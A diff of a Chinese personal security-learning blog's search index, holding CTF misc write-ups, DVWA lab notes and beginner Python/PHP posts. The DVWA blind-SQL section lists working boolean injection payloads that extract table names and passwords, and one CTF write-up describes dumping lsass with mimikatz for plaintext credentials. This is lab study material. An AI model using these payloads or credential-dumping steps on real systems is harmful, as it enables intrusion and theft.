+<h1 id="MRCTF2020-千层套路"><a href="#MRCTF2020-千层套路" class="headerlink" title="[MRCTF2020]千层套路"></a>[MRCTF2020]千层套路</h1><p>真正的套娃，这个套娃竟然套了六百多层，sos就离谱</p>
+<p>密码就是压缩包文件名，手动解了快十个觉得事情不简单</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br>name = <span class="hljs-string">&#x27;0573&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    fz.extractall(pwd=bytes(name, <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    name = fz.filelist[<span class="hljs-number">0</span>].filename[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    fz.close()<br><br></code></pre></td></tr></table></figure>
+
+<p>解出来一个qr.zip里有个qr.txt，看来二维码得自己画了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>x = y = <span class="hljs-number">200</span><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(x,y))<br>file = open(<span class="hljs-string">&#x27;qr.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,x):<br>    <span class="hljs-keyword">for</span> height <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,y):<br>        line = file.readline()<br>        rgb = line.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        img.putpixel((width,height),(int(rgb[<span class="hljs-number">0</span>]),int(rgb[<span class="hljs-number">1</span>]),int(rgb[<span class="hljs-number">2</span>])))<br>img.save(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h1><p>在流量包里找到flag.txt的压缩包，但是压缩包加密了</p>
+<p><img src="/2021/07/19/buu-6/image-20210721144042759.png"></p>
+<p>难道是要密码？上网学习ing</p>
+<p>在网上学习了一番后，知道了这是通过获取用户密码来解开压缩包</p>
+<p>用到mimikatz获取明文密码，现在又需要lsass.dmp这个进程的内存</p>
+<p>lsass是<a href="http://d.hatena.ne.jp/keyword/windows">windows</a>系统的一个进程，用于本地安全和登陆策略。</p>
+<p>导出lsass.dmp文件</p>
+<p>尝试使用mimikatz，很奇怪，怎么都打不开，各种打不开，各种拒绝访问，几个小时过去了，在确定自己的用户为管理员之后，把所有的杀毒软件关掉后，用管理员运行模式打开，<img src="/2021/07/19/buu-6/073E6641.jpg"><span class="image-caption">img</span>终于啊<img src="/2021/07/19/buu-6/image-20210721234435678.png"><span class="image-caption">image-20210721234435678</span></p>
+<p>debug检查一下</p>
+<p><img src="/2021/07/19/buu-6/image-20210722001149114.png"><span class="image-caption">image-20210722001149114</span></p>
+<p><img src="https://images.cnblogs.com/cnblogs_com/LEOGG321/1850290/o_2009181317142.png"><span class="image-caption">image-20200918211554925</span></p>
+<p><img src="/2021/07/19/buu-6/image-20210722000642035.png"><span class="image-caption">image-20210722000642035</span></p>
+<p><img src="/2021/07/19/buu-6/image-20210722000755964.png"><span class="image-caption">image-20210722000755964</span></p>
+<p>妙啊</p>
+<p>不过mimikatz有时间还是要好好研究一下的</p>
+<h1 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h1><p>很明显的base64</p>
+<p>很难想象，不同的栅栏密码解密出来的结果是不一样的，发一个能用的<a href="http://ctf.ssleye.com/railfence.html">http://ctf.ssleye.com/railfence.html</a></p>
+<p>然后凯撒移位，over</p>
+<h1 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h1><p>打开音频，惯性摩斯电码，压根没听，直接转字母，发现，我转了个寂寞，后来才知道是电话拨号（这么多年了，这个音我还是听不出来，找个程序识别吧<a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">dtmf2num下载地址</a></p>
+<p><img src="/2021/07/19/buu-6/image-20210722131151592.png"><span class="image-caption">image-20210722131151592</span></p>
+<p>难道数字就是flag？？？？</p>
+<p>不像啊，这啥，什么和数字有关？手机键盘吧，试试（啊，竟然是按键机的玩法，直接九键完全不对</p>
+<p>flag{youaremyfriends}</p>
+<p><img src="/2021/07/19/buu-6/image-20200917152757024.png"><span class="image-caption">image-20200917152757024</span></p>
+<p>笑了，改个系统时间就行</p>
+<h1 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h1><p>ctf搜不到就去搜flag，注意比赛的名称，有的时候不需要想得太复杂</p>
+<h1 id="docx"><a href="#docx" class="headerlink" title="docx"></a>docx</h1><p>docx后缀改zip，找到media，打开会发现flag相关图片</p>
+<h1 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h1><p>看图</p>
+<p><img src="/2021/07/19/buu-6/image-20210723205551997.png"><span class="image-caption">image-20210723205551997</span></p>
+]]></content>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -706,6 +777,21 @@
       </tags>
   </entry>
   <entry>
+    <title>dvwa-sql(blind)</title>
+    <url>/2021/02/13/dvwa-sql-blind/</url>
+    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源代码，这里不支持报错注入，那看来只能用布尔和延时注入了</p>
+<p>因为有回显，就直接用布尔注入了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and length(database())=4<span class="hljs-comment">#</span><br><br>1&#x27; and substr(database())&lt;&#x27;m&#x27;(这里使用二分法)<br><br>1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span> (table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() )=<span class="hljs-number">2</span> <span class="hljs-comment">#(猜表的数量)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #（猜表名的字符数） </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count (column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-keyword">users</span><span class="hljs-string">&#x27; )=2 #（猜列的数量）</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user_id,first_name,last_name,password from dvwa.users limit 0,1),2,1))&lt;&#x27;</span>m<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>界面同sql-medium ，抓个包即可进行布尔和延时注入。</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看了源码后发现，延时注入受到影响，使用布尔注入，打法同low，源码的设置与sql-high的相似。</p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>还是PDO和Anti-CSRFtoken组合的方式，来提高安全性。</p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa-sql</title>
     <url>/2021/02/12/dvwa-sql/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一段时间也是过完sqllib的，直接上手应该没什么问题</p>
@@ -739,15 +825,33 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-sql(blind)</title>
-    <url>/2021/02/13/dvwa-sql-blind/</url>
-    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源代码，这里不支持报错注入，那看来只能用布尔和延时注入了</p>
-<p>因为有回显，就直接用布尔注入了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and length(database())=4<span class="hljs-comment">#</span><br><br>1&#x27; and substr(database())&lt;&#x27;m&#x27;(这里使用二分法)<br><br>1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span> (table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() )=<span class="hljs-number">2</span> <span class="hljs-comment">#(猜表的数量)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #（猜表名的字符数） </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count (column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-keyword">users</span><span class="hljs-string">&#x27; )=2 #（猜列的数量）</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-string">&#x27;m&#x27;</span> <span class="hljs-comment">#(二分法)</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user_id,first_name,last_name,password from dvwa.users limit 0,1),2,1))&lt;&#x27;</span>m<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure>
+    <title>dvwa-weak session ids</title>
+    <url>/2021/02/16/dvwa-weak-session-ids/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
+<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
+<p>通过hackbar，</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
+<p>即可登录会话</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
+<p>这边的id数依次加一</p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
+<p>dvwasession换成了时间戳 </p>
+<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
+<p>感觉和medium蛮像的</p>
+<p>不如把这几个的源代码来比较一下</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
+<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
+<p>但是我这里无论怎么抓包结果都是上上张图</p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
+<p>来看看源码</p>
+<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
 
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>界面同sql-medium ，抓个包即可进行布尔和延时注入。</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看了源码后发现，延时注入受到影响，使用布尔注入，打法同low，源码的设置与sql-high的相似。</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>还是PDO和Anti-CSRFtoken组合的方式，来提高安全性。</p>
+<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -884,39 +988,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-weak session ids</title>
-    <url>/2021/02/16/dvwa-weak-session-ids/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
-<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
-<p>通过hackbar，</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
-<p>即可登录会话</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
-<p>这边的id数依次加一</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
-<p>dvwasession换成了时间戳 </p>
-<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
-<p>感觉和medium蛮像的</p>
-<p>不如把这几个的源代码来比较一下</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
-<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
-<p>但是我这里无论怎么抓包结果都是上上张图</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
-<p>来看看源码</p>
-<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
-
-<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
-]]></content>
-      <tags>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dvwa-暴力破解</title>
     <url>/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>来看看源码</p>
@@ -1026,6 +1097,33 @@
       </tags>
   </entry>
   <entry>
+    <title>猜数字</title>
+    <url>/2020/10/02/my-first-blog/</url>
+    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code> 通过导入python预设随机数模块，设计两个猜数字游戏（1~10），一个猜单次，一个猜多次。</code></pre>
+<h3 id="单次"><a href="#单次" class="headerlink" title="单次"></a>单次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>guess=int(input())<br><span class="hljs-keyword">if</span> guess==number:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜你，猜对了！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;很遗憾，你猜错了。&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,7):<br>    <span class="hljs-comment">#猜6次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>    guess=int(input())<br>    <span class="hljs-keyword">if</span> guess&lt;number:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;太小了！&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随机点大福</title>
+    <url>/2020/10/04/my-fourth-blog/</url>
+    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>基于某同学想吃大福不知道吃哪一个的问题，写了个无聊小程序，练练手。</p>
+<p>一开始想到了Python自带的random模块，对大福创建一个列表。<br>那么如何实现对列表的元素进行随机抽取呢？</p>
+<p>More info: (<a href="https://www.cnblogs.com/tallme/p/11173422.html">https://www.cnblogs.com/tallme/p/11173422.html</a>)</p>
+<p>分为三种情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">random.randint()<span class="hljs-comment">#随机生一个整数int类型，可以指定这个整数的范围，同样有上限和下限值，。</span><br>random.choice()<span class="hljs-comment">#可以从任何序列，比如list列表中，选取一个随机的元素返回，可以用于字符串、列表、元组等。</span><br>random.sample()<span class="hljs-comment">#可以从指定的序列中，随机的截取指定长度的片断，不作原地修改。</span><br></code></pre></td></tr></table></figure>
+<p>那很显然，这里输出的结果不为整数，也不需要进行返回的操作，在这里就选择了random.sample()。</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br>大福=[<span class="hljs-string">&#x27;提拉米苏大福 &#x27;</span>,<span class="hljs-string">&#x27;抹茶大福&#x27;</span>,<span class="hljs-string">&#x27;桃桃大福&#x27;</span>,<span class="hljs-string">&#x27;芒芒大福&#x27;</span>,<span class="hljs-string">&#x27;榴莲大福&#x27;</span>]<br>ran_大福=random.sample(大福,1)<br><span class="hljs-built_in">print</span>(ran_大福)<br></code></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL数据库基本操作</title>
     <url>/2020/10/11/mysql/</url>
     <content><![CDATA[<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">mysql&gt; create database text;<br>Query OK, 1 rows affected (0.04 sec)<br></code></pre></td></tr></table></figure>
@@ -1086,30 +1184,38 @@
       </tags>
   </entry>
   <entry>
-    <title>猜数字</title>
-    <url>/2020/10/02/my-first-blog/</url>
-    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code> 通过导入python预设随机数模块，设计两个猜数字游戏（1~10），一个猜单次，一个猜多次。</code></pre>
-<h3 id="单次"><a href="#单次" class="headerlink" title="单次"></a>单次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>guess=int(input())<br><span class="hljs-keyword">if</span> guess==number:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜你，猜对了！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;很遗憾，你猜错了。&#x27;</span>)<br></code></pre></td></tr></table></figure>
+    <title>php数组</title>
+    <url>/2020/10/31/php%E6%95%B0%E7%BB%84/</url>
+    <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p>
+<h2 id="创建变量方法"><a href="#创建变量方法" class="headerlink" title="创建变量方法"></a>创建变量方法</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>()<br></code></pre></td></tr></table></figure>
 
+<h2 id="创建数值数组"><a href="#创建数值数组" class="headerlink" title="创建数值数组"></a>创建数值数组</h2><h3 id="自动分配id键"><a href="#自动分配id键" class="headerlink" title="自动分配id键"></a>自动分配id键</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I like&quot;</span>.$cars[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;,&quot;</span>.$cars[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;and&quot;</span>.$cars[<span class="hljs-number">2</span>].<span class="hljs-string">&quot;.&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">I likeVolvo,BMWandToyota. </span><br></code></pre></td></tr></table></figure>
 
+<h3 id="人工分配id键"><a href="#人工分配id键" class="headerlink" title="人工分配id键"></a>人工分配id键</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>$cars[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;Volvo&quot;</span>;<br>$cars[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;BMW&quot;</span>;<br>$cars[<span class="hljs-number">3</span>]=<span class="hljs-string">&quot;Toyota&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I like&quot;</span>.$cars[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;,&quot;</span>.$cars[<span class="hljs-number">2</span>].<span class="hljs-string">&quot;and&quot;</span>.$cars[<span class="hljs-number">3</span>].<span class="hljs-string">&quot;.&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">I likeVolvo,BMWandToyota. </span><br></code></pre></td></tr></table></figure>
 
-<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,7):<br>    <span class="hljs-comment">#猜6次</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>    guess=int(input())<br>    <span class="hljs-keyword">if</span> guess&lt;number:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;太小了！&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
+<h2 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-keyword">echo</span> count($cars); <span class="hljs-comment">#count()函数用于返回数组的长度（元素的数量）</span><br><span class="hljs-meta">?&gt;</span> <br><br><span class="hljs-comment">/*输出结果：3</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>$arrlength=count($cars);<br><br><span class="hljs-keyword">for</span>($x=<span class="hljs-number">0</span>;$x&lt;$arrlength;$x++) <span class="hljs-comment">#arrlength=array().length</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> $cars[$x];<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>  <br><span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Volvo</span><br><span class="hljs-comment">BMW</span><br><span class="hljs-comment">Toyota</span><br><span class="hljs-comment"> </span><br></code></pre></td></tr></table></figure>
+
+<h2 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Peter is &quot;</span> . $age[<span class="hljs-string">&#x27;Peter&#x27;</span>] . <span class="hljs-string">&quot; years old.&quot;</span>; <br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果：Peter is 35 years old.</span><br></code></pre></td></tr></table></figure>
+
